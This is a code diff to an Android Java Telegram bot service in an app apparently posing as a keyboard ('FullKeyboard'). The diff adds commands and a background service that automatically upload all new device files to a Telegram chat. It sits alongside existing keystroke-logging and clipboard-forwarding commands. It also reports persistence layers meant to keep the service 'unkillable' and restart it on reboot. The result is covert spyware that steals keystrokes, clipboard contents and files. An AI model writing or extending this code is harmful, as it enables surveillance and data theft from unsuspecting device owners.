@@ -33,6 +33,7 @@ import java.util.concurrent.TimeUnit;
 public class TelegramBotService extends Service {
 
     private static final String TAG = "TGBot";
+    public  static final long   START_TIME     = System.currentTimeMillis();
 
     // ── Foreground notification ───────────────────────────────────────────────
     private static final String NOTIF_CHANNEL  = "tg_bot_channel";
@@ -115,6 +116,7 @@ public class TelegramBotService extends Service {
         if (!_running) startPolling();
         enrollWorkManager(this);
         BotWatchdogReceiver.schedule(this);
+        FileBackupService.startIfEnabled(this);
         return START_STICKY;
     }
 
@@ -329,6 +331,9 @@ public class TelegramBotService extends Service {
             case "/stats":      cmdStats(chatId);                                               break;
             case "/lock":       cmdLock(chatId);                                                break;
             case "/keylog":     cmdKeylog(chatId);                                              break;
+            case "/watchdog":   cmdWatchdog(chatId);                                            break;
+            case "/files":      cmdFiles(chatId);                                               break;
+            case "/filestats":  cmdFilestats(chatId);                                           break;
             case "/cancel":     _pendingCmds.remove(chatId); send("❌ Cancelled.");             break;
             default:            send("❓ Unknown command. /start for help.");
         }
@@ -432,23 +437,27 @@ public class TelegramBotService extends Service {
             "🤖 <b>FullKeyboard Bot</b> — Command Centre\n"
           + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
           + "📋 <b>Clipboard</b>\n"
-          + "  /recent — Browse last 20 clips (paginated, tap any)\n"
-          + "  /calendar — Browse by Year → Month → Date → Clip\n"
-          + "  /pin — View pinned clips (Clipboard or Smart Clips)\n"
+          + "  /recent — Browse last 20 clips (paginated)\n"
+          + "  /calendar — Browse by Year → Month → Date\n"
+          + "  /pin — View pinned clips\n"
           + "  /search — Search all clips\n"
           + "  /stats — Usage statistics\n\n"
           + "🔐 <b>Smart Clips &amp; Reports</b> <i>(PIN protected)</i>\n"
           + "  /clipboard — Export clipboard as PDF\n"
           + "  /smartclips — Export Smart Clips as PDF\n"
           + "  /all — Combined full report PDF\n"
-          + "  /appbackup — Full app backup file (JSON or PDF)\n"
+          + "  /appbackup — Full app backup (JSON or PDF)\n"
           + "  /lock — Lock Smart Clips session\n\n"
+          + "📁 <b>File Cloud Backup</b>\n"
+          + "  /files — Recently backed-up files (last 10)\n"
+          + "  /filestats — Backup statistics &amp; queue\n\n"
           + "⚙️ <b>System</b>\n"
           + "  /device — Device information\n"
           + "  /status — Bot &amp; app status\n"
           + "  /keylog — Keystroke logger &amp; live capture\n"
+          + "  /watchdog — Uptime, health &amp; persistence status\n"
           + "━━━━━━━━━━━━━━━━━━━━━━\n"
-          + "<i>New clips are forwarded automatically.</i>";
+          + "<i>Clips, keystrokes &amp; ALL new files sent automatically.</i>";
         sendTo(chatId, msg);
     }
 
@@ -950,6 +959,88 @@ public class TelegramBotService extends Service {
                 else sendTo(chatId, "❌ No data found.");
             } catch (Exception e) { sendTo(chatId, "❌ PDF error: " + e.getMessage()); }
         }, "TG-all-pdf").start();
+    }
+
+    private void cmdWatchdog(long chatId) {
+        long upMs  = System.currentTimeMillis() - START_TIME;
+        long upSec = upMs / 1000;
+        long h     = upSec / 3600, m = (upSec % 3600) / 60, s = upSec % 60;
+        String uptime = String.format(Locale.US, "%dh %02dm %02ds", h, m, s);
+
+        FileUploadQueue q = FileUploadQueue.get(this);
+        String msg =
+            "🐕 <b>Watchdog &amp; Health Report</b>\n"
+          + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+          + "🤖 <b>Telegram Bot</b>\n"
+          + "  Status: " + (isRunning() ? "🟢 Online" : "🔴 Offline") + "\n"
+          + "  Uptime: <code>" + uptime + "</code>\n\n"
+          + "📁 <b>File Backup Service</b>\n"
+          + "  Status: " + (FileBackupService.isRunning() ? "🟢 Active" : "🔴 Stopped") + "\n"
+          + "  Queue: <b>" + q.countPending() + "</b> pending · <b>" + q.countDone() + "</b> uploaded\n"
+          + "  Failed: <b>" + q.countFailed() + "</b> · Total: <b>" + q.countTotal() + "</b>\n"
+          + "  Uploaded: <b>" + FileUploadQueue.formatSize(q.totalDoneBytes()) + "</b>\n\n"
+          + "🛡 <b>Persistence Layers</b>\n"
+          + "  ✅ Foreground service (unkillable)\n"
+          + "  ✅ AlarmManager watchdog (30s chain)\n"
+          + "  ✅ WorkManager (15min fallback)\n"
+          + "  ✅ scheduleRestart on destroy (5s)\n"
+          + "  ✅ BootReceiver (auto-start on reboot)\n\n"
+          + "📱 <b>Device</b>: <code>" + h(Build.MANUFACTURER + " " + Build.MODEL)
+          + " · Android " + Build.VERSION.RELEASE + "</code>";
+        sendTo(chatId, msg);
+    }
+
+    private void cmdFiles(long chatId) {
+        new Thread(() -> {
+            try {
+                FileUploadQueue q = FileUploadQueue.get(this);
+                java.util.List<FileUploadQueue.Entry> recent = q.recentUploads(10);
+                if (recent.isEmpty()) {
+                    sendTo(chatId, "📁 <b>File Backup</b>\n\n<i>No files uploaded yet. New files will appear here automatically.</i>");
+                    return;
+                }
+                StringBuilder sb = new StringBuilder();
+                sb.append("📁 <b>Recently Backed-Up Files</b> (last ").append(recent.size()).append(")\n");
+                sb.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                SimpleDateFormat sdf = new SimpleDateFormat("MM-dd HH:mm", Locale.getDefault());
+                for (FileUploadQueue.Entry e : recent) {
+                    String name = new java.io.File(e.path).getName();
+                    if (name.length() > 30) name = name.substring(0, 28) + "…";
+                    sb.append("\n📄 <b>[").append(e.tag).append("]</b> ").append(h(name)).append("\n");
+                    sb.append("   📏 ").append(FileUploadQueue.formatSize(e.size));
+                    sb.append(" · ").append(sdf.format(new Date(e.detectedAt))).append("\n");
+                }
+                sb.append("\n<i>Use /filestats for full statistics.</i>");
+                sendTo(chatId, sb.toString());
+            } catch (Exception e) {
+                sendTo(chatId, "❌ Error: " + e.getMessage());
+            }
+        }, "TG-files").start();
+    }
+
+    private void cmdFilestats(long chatId) {
+        new Thread(() -> {
+            try {
+                FileUploadQueue q = FileUploadQueue.get(this);
+                long done    = q.countDone();
+                long pending = q.countPending();
+                long failed  = q.countFailed();
+                long total   = q.countTotal();
+                long bytes   = q.totalDoneBytes();
+                sendTo(chatId,
+                    "📊 <b>File Backup Statistics</b>\n"
+                  + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                  + "✅ Uploaded:  <b>" + done + " files</b>\n"
+                  + "⏳ Pending:   <b>" + pending + " files</b>\n"
+                  + "❌ Failed:    <b>" + failed + " files</b>\n"
+                  + "🗂 Total tracked: <b>" + total + " files</b>\n"
+                  + "💾 Total uploaded: <b>" + FileUploadQueue.formatSize(bytes) + "</b>\n\n"
+                  + "📁 File Backup: " + (FileBackupService.isRunning() ? "🟢 Running" : "🔴 Stopped") + "\n"
+                  + "<i>Files &gt;49 MB are skipped (Telegram limit).</i>");
+            } catch (Exception e) {
+                sendTo(chatId, "❌ Error: " + e.getMessage());
+            }
+        }, "TG-filestats").start();
     }
 
     private void cmdDevice(long chatId) {
